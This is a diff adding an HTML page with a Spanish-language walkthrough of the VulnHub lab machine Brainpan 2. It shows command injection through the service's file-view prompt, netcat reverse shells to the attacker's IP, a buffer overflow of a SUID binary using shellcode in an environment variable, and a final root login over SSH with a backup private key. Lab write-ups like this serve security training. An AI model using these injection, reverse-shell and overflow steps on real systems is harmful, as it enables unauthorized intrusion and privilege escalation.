@@ -1,0 +1,460 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Brainpan 2 VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/brainpan2.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Brainpan 2 VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Brainpan 2 VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Brainpan 2 VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Brainpan 2 de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Brainpan 2 VulnHub</h1>
+          <p>Resolución de la máquina Brainpan 2 de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, nuevamente vemos el 9999 y el 10000</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.63
+Nmap scan report for 192.168.100.63
+PORT      STATE SERVICE
+9999/tcp  open  abyss
+10000/tcp open  snet-sensor-mgmt</span>
+</code></pre></div></div>
+
+<div><p>En el puerto 10000 como en la máquina anterior encontramos una plantilla sin mucho sentido</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Al conectarnos al puerto 9999 tenemos una interfaz parecida, nos dice que entremos como GUEST</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> 192.168.100.63 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 2.0________________________]
+                             </span><span class="na">LOGIN AS GUEST</span><span class="p">
+
+                          >></span>
+</code></pre></div></div>
+
+<div><p>Al entrar como GUEST nos da un comando para listar las funciones que tiene el programa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >></span><span class="kd"> GUEST</span><span class="p">
+                          ACCESS GRANTED
+
+
+                             *  *  *  *                                
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+    </span><span class="na">TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  </span><span class="p">
+                             *  *  *  *                                
+
+
+                          >></span>
+</code></pre></div></div>
+
+<div><p>Listamos las funciones y entre ellas esta FILES que parece ejecutar un 'ls -l'</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >></span><span class="kd"> TELL ME MORE</span><span class="p">
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE</span><span class="p">
+
+                          >></span><span class="kd"> FILES</span><span class="p">
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
+                          >></span>
+</code></pre></div></div>
+
+<div><p>Otra de las funciones es VIEW que nos pide un archivo y parece hacele un cat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >></span><span class="kd"> VIEW</span><span class="p">
+    ENTER FILE TO DOWNLOAD: </span><span class="kd">test-1</span><span class="p">
+Hello world
+                          >></span>
+</code></pre></div></div>
+
+<div><p>Podemos intentar hacer un ; y concatenar un comando y parece que funciona</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >></span><span class="kd"> VIEW</span><span class="p">
+    ENTER FILE TO DOWNLOAD: </span><span class="kd">a; id</span><span class="p">
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+                          >></span>
+</code></pre></div></div>
+
+<div><p>Entonces simplemente ejecutamos una revshell y nos convertimos en anansi<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >></span><span class="kd"> VIEW</span><span class="p">
+    ENTER FILE TO DOWNLOAD: </span><span class="kd">a; nc -e /bin/bash 192.168.100.41 443</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.63
+script /dev/null -c bash
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/opt/brainpan</span><span class="p">$ id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/opt/brainpan</span><span class="p">$ hostname -I
+192.168.100.63 
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/opt/brainpan</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando archivos suid encontramos msg_root que... pertenece a root?</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+</span><span class="kd">/home/reynard/msg_root</span><span class="p">
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /home/reynard/msg_root
+-rwsr-xr-x 1 </span><span class="na">root root</span><span class="p"> 8999 Nov  6  2013 </span><span class="kd">/home/reynard/msg_root</span><span class="p">
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>El ejecutar el binario nos pide 2 argumentos un usuario y un mensaje que nos printea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ /home/reynard/msg_root
+usage: msg_root username message
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ /home/reynard/msg_root username message
+Your message is message
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Esta explotación es sencilla, se trata de crear una variable de entorno con el shellcode que usaremos, conseguir la direccion que ejecutara ese shellcode con el programa y finalmente correr el programa pasandole el offset mas la dirección, asi conseguimos una bash</p></div>
+
+<div><p>Iniciamos sacando el offset con ayuda de gdb con peda, nos dice que es 14</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb</span><span class="p"> -q ./msg_root
+Reading symbols from ./msg_root...
+</span><span class="kd">gdb-peda$</span><span class="p"> pattern_create 100 pattern
+Writing pattern of 100 chars to filename "pattern"
+</span><span class="kd">gdb-peda$</span><span class="p"> run $(cat pattern) pwned
+Starting program: /home/gato/Desktop/Vulnhub/Brainpan2/msg_root $(cat pattern) pwned
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
+</span><span class="s2">EAX</span><span class="p">: 0x41416e41 ('AnAA')
+</span><span class="s2">EBX</span><span class="p">: 0x0 
+</span><span class="s2">ECX</span><span class="p">:</span><span class="na"> 0x804a1a5</span><span class="p"> --> 0x0 
+</span><span class="s2">EDX</span><span class="p">:</span><span class="na"> 0x804a1a0</span><span class="p"> ("pwned")
+</span><span class="s2">ESI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
+</span><span class="s2">EDI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
+</span><span class="s2">EBP</span><span class="p">:</span><span class="na"> 0xffffd6b8</span><span class="p"> --> </span><span class="na">0xffffd6c8</span><span class="p"> --> 0x0 
+</span><span class="s2">ESP</span><span class="p">:</span><span class="na"> 0xffffd694</span><span class="p"> --> </span><span class="kd">0x804872e</span><span class="p"> (&ltget_name+141>:	mov    eax,DWORD PTR [ebp-0x8])
+</span><span class="s2">EIP</span><span class="p">: 0x41416e41 ('AnAA')
+</span><span class="s2">EFLAGS</span><span class="p">: 0x10246 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust </span><span class="kd">ZERO </span><span class="s2">sign trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
+</span><span class="na">[-------------------------------------code-------------------------------------]
+</span><span class="kd">Invalid $PC address: 0x41416e41
+</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="na">0xffffd694</span><span class="p"> --> </span><span class="kd">0x804872e</span><span class="p"> (&ltget_name+141>:	mov    eax,DWORD PTR [ebp-0x8])
+0004| </span><span class="na">0xffffd698</span><span class="p"> --> </span><span class="na">0xffffd6a6</span><span class="p"> ("AAA%AAsAAB\240\241\004\bAnAA\310\326\377\377{\207\004\bg\331\377\377\314\331\377\377")
+0008| </span><span class="na">0xffffd69c</span><span class="p"> --> </span><span class="na">0x804a1a0</span><span class="p"> ("pwned")
+0012| </span><span class="na">0xffffd6a0</span><span class="p"> --> 0x5 
+0016| </span><span class="na">0xffffd6a4</span><span class="p"> --> 0x4141d774 
+0020| </span><span class="na">0xffffd6a8</span><span class="p"> ("A%AAsAAB\240\241\004\bAnAA\310\326\377\377{\207\004\bg\331\377\377\314\331\377\377")
+0024| </span><span class="na">0xffffd6ac</span><span class="p"> ("sAAB\240\241\004\bAnAA\310\326\377\377{\207\004\bg\331\377\377\314\331\377\377")
+0028| </span><span class="na">0xffffd6b0</span><span class="p"> --> </span><span class="na">0x804a1a0</span><span class="p"> ("pwned")
+</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
+Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
+</span><span class="na">0x41416e41 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
+</span><span class="kd">gdb-peda$ </span><span class="p">pattern_offset 0x41416e41
+1094807105 found at offset: </span><span class="na">14</span><span class="p">
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+
+<div><p>Para conseguir la dirección primero tenemos que descargar, compilar un binario en local y compartirlo ya que la máquina no tiene gcc</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> https://raw.githubusercontent.com/intere/hacking/master/booksrc/getenvaddr.c &>/dev/null
+
+</span><span class="s2">❯ gcc</span><span class="p"> -m32 getenvaddr.c -o getenvaddr
+
+</span><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div>
+
+<div><p>Ahora desde la máquina lo descargamos en /tmp y le damos permisos de ejecución</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ wget http://192.168.100.41/getenvaddr &>/dev/null
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ chmod +x getenvaddr
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ ./getenvaddr
+Usage: ./getenvaddr &ltenvironment variable> &lttarget program name>
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Primero definimos la variable shellcode, en este caso usare un <a href="https://www.exploit-db.com/shellcodes/13697">shellcode </a>que me de una bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ export SHELLCODE=$(python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora con ayuda del binario conseguimos la direccion donde se ejecutará la variable</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ ./getenvaddr SHELLCODE /home/reynard/msg_root 
+SHELLCODE will be at 0xbfffff18
+</span><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Hay que tener en cuenta que estamos en 32 bits por lo que le daremos la vuelta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">\xbf\xff\xff\x18     -->     \x18\xff\xff\xbf</span>
+</code></pre></div></div>
+
+<div><p>Entonces le pasamos como primer argumento el offset mas la dirección y como segundo lo que sea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">anansi@brainpan2</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ /home/reynard/msg_root $(python -c 'print("A" * 14 + "\x18\xff\xff\xbf")') pwned
+</span><span class="kd">bash-4.2$</span><span class="p"> whoami
+root
+</span><span class="kd">bash-4.2$</span><span class="p"> hostname -I
+192.168.100.63 
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Espera, ya somos root?, no puede ser tan fácil... , veamos el uid de root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> id root
+uid=104(root) gid=106(root) groups=106(root)
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Bueno somos usuario root pero el uid es 104 y gid 1006, no tenemos privilegios, nuestro objetivo es llegar a root con un espacio (root ) que es el que tiene uid 0<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> id "root "
+uid=0(root ) gid=0(root ) groups=0(root )
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Si volvemos a buscar archivos suid, ahora vemos un .exe que pertenece a el usuario puck<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> find / -perm -4000 2>/dev/null
+</span><span class="kd">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><span class="p">
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+</span><span class="kd">bash-4.2$</span><span class="p"> ls -l /opt/old/brainpan-1.8/brainpan-1.8.exe
+-rwsr-xr-x 1 </span><span class="na">puck puck</span><span class="p"> 17734 Nov  4  2013 </span><span class="kd">/opt/old/brainpan-1.8/brainpan-1.8.exe
+bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Aunque la extensión es .exe es un binario de linux que abre un socket en local por el puerto 9333<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> cd /opt/old/brainpan-1.8/
+</span><span class="kd">bash-4.2$</span><span class="p"> ./brainpan-1.8.exe
+port = 9333
+ipaddr = 127.0.0.1
++ bind done
++ waiting for connections...</span>
+</code></pre></div></div>
+
+<div><p>El config se almacena en un archivo cfg del cual somos propietarios<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> ls -l
+-rwsr-xr-x 1 puck puck  17734 Nov  4  2013 brainpan-1.8.exe
+-rw-r--r-- 1 puck puck   1227 Nov  5  2013 brainpan.7
+-rw-rw-rw- 1 puck staff    25 Jan 14 05:43 brainpan.cfg
+</span><span class="kd">bash-4.2$</span><span class="p"> cat brainpan.cfg
+port=9333
+ipaddr=127.0.0.1
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Cambiamos el 127.0.0.1 por 0.0.0.0 para poder conectarnos desde fuera, ahora lo ejecutamos<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> echo "port=9333" > brainpan.cfg
+</span><span class="kd">bash-4.2$</span><span class="p"> echo "ipaddr=0.0.0.0" >> brainpan.cfg
+</span><span class="kd">bash-4.2$</span><span class="p"> ./brainpan-1.8.exe 
+port = 9333
+ipaddr = 0.0.0.0
++ bind done
++ waiting for connections...</span>
+</code></pre></div></div>
+
+<div><p>Al conectarnos podemos ver que es el mismo servicio que esta corriendo en el 9999<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> 192.168.100.63 9333
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 1.8________________________]
+                             LOGIN AS GUEST                             
+
+                          >></span>
+</code></pre></div></div>
+
+<div><p>Repetimos el proceso del inicio y conseguimos una shell como puck<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> </span><span class="kd">GUEST</span><span class="p">
+                          ACCESS GRANTED
+
+
+                             *  *  *  *                                
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
+                             *  *  *  *                                
+
+
+                          >> </span><span class="kd">VIEW</span><span class="p">
+    ENTER FILE TO DOWNLOAD: </span><span class="kd">a; nc -e /bin/sh 192.168.100.41 443</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.63
+script /dev/null -c "bash -p"
+</span><span class="kd">bash-4.2$</span><span class="p"> whoami
+puck
+</span><span class="kd">bash-4.2$</span><span class="p"> hostname -I
+192.168.100.63 
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Para mejorar nuestra shell podemos definir nuestro uid y lanzar una bash<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> python
+Python 2.7.3 (default)
+</span><span class="kd">>>></span><span class="p"> import os, pty
+</span><span class="kd">>>></span><span class="p"> os.setresuid(1001, 1001, 1001)
+</span><span class="kd">>>></span><span class="p"> pty.spawn("/bin/bash")
+</span><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Hay un directorio .backup oculto que tiene una id_rsa privada probablemente de 'root '<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ find
+.
+./.ssh
+./.ssh/known_hosts
+./.ssh/id_rsa.pub
+./.ssh/id_rsa
+./.profile
+./.bash_history
+./.backup
+./.backup/.ssh
+./.backup/.ssh/id_rsa.pub
+</span><span class="kd">./.backup/.ssh/id_rsa</span><span class="p">
+./.backup/.profile
+./.backup/.bash_history
+./.backup/.bashrc
+./.backup/.bash_logout
+./.bashrc
+./.bash_logout
+</span><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Pero el servicio ssh parece estar desconectado al menos en el puerto 22<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ssh "root "@localhost
+ssh: connect to host localhost port 22: Connection refused
+</span><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En la configuracion podemos ver que corre solo en 127.0.1.1 por el puerto 2222<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/ssh/sshd_config | grep -vE "^#|^$" | head -n2
+Port 2222
+ListenAddress 127.0.1.1
+</span><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos podemos conectar como 'root ' con la id_rsa en .backup contra la 127.0.0.1 por el puerto 2222<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">puck@brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ssh "root "@127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa
+</span><span class="s2">root @brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root ) gid=0(root ) groups=0(root )
+</span><span class="s2">root @brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+192.168.100.63 
+</span><span class="s2">root @brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/flag.txt 
+
+                          !!! CONGRATULATIONS !!!
+
+                 You've completed the Brainpan 2 challenge! 
+                 Or have you...? 
+
+                 Yes, you have! Pat yourself on the back. :-)
+
+                 Questions, comments, suggestions for new VM
+                 challenges? Let me know! 
+
+
+                 Twitter: @superkojiman
+                 Email  : contact@techorganic.com
+                 Web    : http://www.techorganic.com
+
+</span><span class="s2">root @brainpan2</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
